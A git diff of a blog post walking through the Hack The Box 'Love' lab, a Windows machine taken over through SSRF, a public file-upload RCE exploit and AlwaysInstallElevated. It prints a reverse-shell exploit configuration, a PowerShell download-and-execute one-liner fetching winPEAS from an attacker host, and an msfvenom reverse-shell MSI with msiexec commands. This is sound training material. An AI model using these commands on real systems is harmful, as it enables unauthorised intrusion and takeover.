@@ -7,7 +7,7 @@ categories: [hack-the-box, writeup, love, windows]
 cover: ./assets/2021-08-09-hack-the-box-love/cover.png
 ---
 
-In this post, I walk you through Love from Hack the Box, an easy Windows box where good enumeration is the key to success. The box contains a bunch of open ports, the main interesting ones serving HTTP are 80, 443 and 5000. This last one gives access denied, but on ports 80 and 443 you will find a voting system secured by a login prompt. Via the certificate on port 443 you can leak some extra domains that give access to a tool that contains a CSRF that allows you to access services on localhost. This way, you get access to the service running on port 5000, which has admin credentials that give access to the voting system. Once in the voting system, we can leverage a known CVE to upload a malicious payload and get a reverse shell on the box. On the box, you then execute an msi to get root. With all that said, let's dive right in and start our port scan enumeration.
+In this post, I walk you through Love from Hack the Box, an easy Windows box where good enumeration is the key to success. The box contains a bunch of open ports, the main interesting ones serving HTTP are 80, 443 and 5000. This last one gives access denied, but on ports 80 and 443 you will find a voting system secured by a login prompt. Via the certificate on port 443 you can leak some extra domains that give access to a tool that contains a CSRF that allows you to access services on localhost. This way, you get access to the service running on port 5000, which has admin credentials that grant access to the voting system. Once in the voting system, we can leverage a known CVE to upload a malicious payload and get a reverse shell on the box. On the box, you then execute an `msi` to get root. With all that said, let's dive right in and start our port scan enumeration.
 
 ## Enumeration
 We are starting our investigation with a nmap scan. This allows getting a better overview of what is exposed on the target machine. We'll use `-sV` to enumerate versions, `-sC` to run all default scripts, and store the output in a file named `nmap.txt`. This way, we can always refer back to it later. This machine contains a fair few of open ports, hence why the scan might take some time. Add `-v` as a parameter if you want nmap to show open ports while it finds them.
@@ -92,19 +92,19 @@ sudo vim /etc/hosts
 10.10.10.239    www.love.htb staging.love.htb
 ```
 
-On www.love.htb we find Voting System of some sorts protected by a login page:
+On `www.love.htb` we find a Voting System application protected by a login page:
 
 ![Voting System On WWW](./assets/2021-08-09-hack-the-box-love/www-love-login.png)
 
-On staging.love.htb we find some sort of a file uploader:
+On `staging.love.htb`, we find some file scanner.
 
 ![Staging Love File Uploader](./assets/2021-08-09-hack-the-box-love/staging-love-home.png)
 
-Going to 10.10.10.239:80 we get presented with the Voting app again. But trying to open `443` or `5000` we get a forbidden:
+Going to `10.10.10.239:80` we get presented with the Voting app again. But trying to open `443` or `5000` we get presented with a forbidden page:
 
 ![Port 5000 Forbidden](./assets/2021-08-09-hack-the-box-love/port-5000-forbidden.png)
 
-Given the `Voting System` app is protected by a login, let's focus on the file scanner tool first. But before we do that let's kick run a gobuster scan against this app and see if we can maybe find some hidden paths that can leak some interesting information:
+Given the `Voting System` app is protected by a login, let's focus on the file scanner tool first. But before we do that, let's kick run a `gobuster` scan against this app and see if we can maybe find some hidden paths that can leak some interesting information:
 
 ```sh
 $ gobuster dir -u http://www.love.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt  -o ./gobuster-php.txt -x php
@@ -132,7 +132,7 @@ We can see that the file uploader calls our local service, downloads the file, a
 
 ![Intercept Upload Send To Repeater](./assets/2021-08-09-hack-the-box-love/file-uploader-intercept-send-to-repeater.png)
 
-In the repeater we can start tweaking this request and have it upload our different payloads that we prepared earlier. But whatever we upload  just get's send back to us. So other than maybe XSS this seems to be a dead end:
+We can start tweaking this request in the repeater and upload the different payloads that we prepared earlier. But whatever we upload just get's send back to us. So other than maybe XSS, this seems to be a dead-end:
 
 ![Burp Upload Hello.php](./assets/2021-08-09-hack-the-box-love/file-uploader-burp-hello-php.png)
 
@@ -140,18 +140,19 @@ But we can see that this tool is actually sending out HTTP requests. We could se
 
 ![Leaked Admin Credentials](./assets/2021-08-09-hack-the-box-love/file-uploader-admin-creds.png)
 
-## Foothold
-We got a set of credentials now that we can try to login with in the Voting System application. If you look at your gobuster result you will see a path `/admin` , let's go here and see if our credentials work:
 
+## Foothold
+We got a set of credentials that we can use to log into the Voting System application. If you look at the results from the `gobuster` scan we kicked off earlier. You will see a `/admin` path. Let's open that page and see if these credentials work:
 - **Username**: admin
 - **Password**: @LoveIsInTheAir!!!!
 
 ![Voting System Admin Access](./assets/2021-08-09-hack-the-box-love/voting-system-admin.png)
 
-Digging for an exploit in the `Voting System` application on searchsploit:
+Let's use `searchploit` and see if we can find a known exploit that we can use to get a foothold on the box:
 
 ```sh
 $ searchsploit "Voting System"
+
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                             |  Path
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -162,51 +163,108 @@ Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)       
 Shellcodes: No Results
 ```
 
-Ok so the `Voting System 1.0 - File Upload RCE` seems interesting and usefull to use. Let's dive in:
+The last one looks interesting: `Voting System 1.0 - File Upload RCE`  and get a copy of the script into a local folder:
 
 ```sh
-$ searchsploit -p 49445
+$  hack searchsploit -m 49445
+
   Exploit: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
       URL: https://www.exploit-db.com/exploits/49445
      Path: /usr/share/exploitdb/exploits/php/webapps/49445.py
 File Type: ASCII text, with very long lines, with CRLF line terminators
 
-Copied EDB-ID #49445's path to the clipboard
+Copied to: /home/nickvd/HTB/Love/hack/49445.py
 ```
 
-This gives us the full path to the exploit, lets copy it and have a look at it.
+As is, the script doesn't work, so we'll need to make a couple of changes. First, we'll need to add the correct URL, username, and password in the settings area. Besides that, we'll also need to change the hardcoded URL's. The script assumes that the whole app is running behind `/votesystem`, but in our case everything is hosted behind `/`:
 
-TODO: Exploit step by step how the exploit works and what variables need to be changed
+
+```diff
+ import requests
+
+ # --- Edit your settings here ----
+-IP = "192.168.1.207" # Website's URL
+-USERNAME = "potter" #Auth username
+-PASSWORD = "password" # Auth Password
+-REV_IP = "192.168.1.207" # Reverse shell IP
++IP = "www.love.htb" # Website's URL
++USERNAME = "admin" #Auth username
++PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
++REV_IP = "10.10.14.28" # Reverse shell IP
+ REV_PORT = "8888" # Reverse port
+ # --------------------------------
+
+-INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
+-LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
+-VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
+-CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
++INDEX_PAGE = f"http://{IP}/admin/index.php"
++LOGIN_URL = f"http://{IP}/admin/login.php"
++VOTE_URL = f"http://{IP}/admin/voters_add.php"
++CALL_SHELL = f"http://{IP}/images/shell.php"
+
+ payload = """
+```
+
+With those changes in place, all we have to do now is prepare our reverse listener and kick of the script:
 
 ![Reverse Shell](./assets/2021-08-09-hack-the-box-love/reverse-shell.png)
 
-## Lateral Movement
-
-Launching winpeas:
+And we got a shell on the box that gives access to the user flag:
 
 ```powershell
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://10.10.14.28:8000/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+PS C:\xampp\htdocs\omrs\images> whoami
+love\phoebe
+
+PS C:\xampp\htdocs\omrs\images> ls c:/users/phoebe/desktop
+
+    Directory: C:\users\phoebe\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         8/10/2021   8:43 AM             34 user.txt
+
 ```
 
-TODO: find winpeas result that shows exploit related to https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
+## Lateral Movement
+To fingerprint the system and get an idea of our next steps lets run [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). After cloning the repo to your local machine navigate to the directory containing  `winPEASany.exe` and start a Python web server with  `python m http.server`. This way we can with `PowerShell` easily download and directly execute this binary:
+
+```powershell
+PS C:\xampp\htdocs\omrs\images> $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://10.10.14.28:8000/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+<...>
+
+͹ Checking AlwaysInstallElevated
+  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+
+<...>
+```
+
+I removed any noice from the very long output that `WinPEAS` generates. The interesting part is that `AlwaysInstallElevetad` is set to 1. These registry keys tell windows tha a user of any privilage can install an `msi` file as `NT AUTHORITY\SYSTEM`. All we need to do here is craft a malicious installer and run it to get access as the system user.
+
+To generate this installer we can use a tool called `msfvenom` and have it execute a reverse shell payload that we can point to an `nc` listener running on our local machine. On our local machine execute the following command to generate the payload:
 
 ```sh
 $ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.28 lport=6666 -f msi > payload.msi
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of msi file: 159744 bytes
 ```
 
-```powershell
+You can see it generated a 32-bit payload. On this machine, the payload type isn't all too important. Windows has a thing called `WoW` or Windows on Windows, allowing us to easily execute 32-bit binaries on a 64-bit system. If you ever bumped into Windows Core or Windows IOT, then `WoW` will most likely not be present.. In that scenario, it will be important you create the correct payload. 
 
-cd $env:tmp
-
-Invoke-WebRequest -Uri "http://10.10.14.28:8000/payload.msi" -OutFile "$env:tmp/payload.msi"
-
-msiexec /quiet /qn /i payload.msi
-
-dir c:\Users\Administrator\Desktop
-
-```
+From the directory where you created the `msi` installer, launch another web server with python se can easily drop the installer on the box:
 
 ![NT System Shell](./assets/2021-08-09-hack-the-box-love/nt-system-shell.png)
+
+And we are in! As you can see we have access as `NT AUTHORITY\SYSTEM` and are able to read the root flag:
 
 ```sh
 C:\WINDOWS\system32>dir c:\Users\Administrator\Desktop
@@ -222,5 +280,3 @@ dir c:\Users\Administrator\Desktop
                1 File(s)             34 bytes
                2 Dir(s)   2,219,917,312 bytes free
 ```
-
-And we have our root flag!
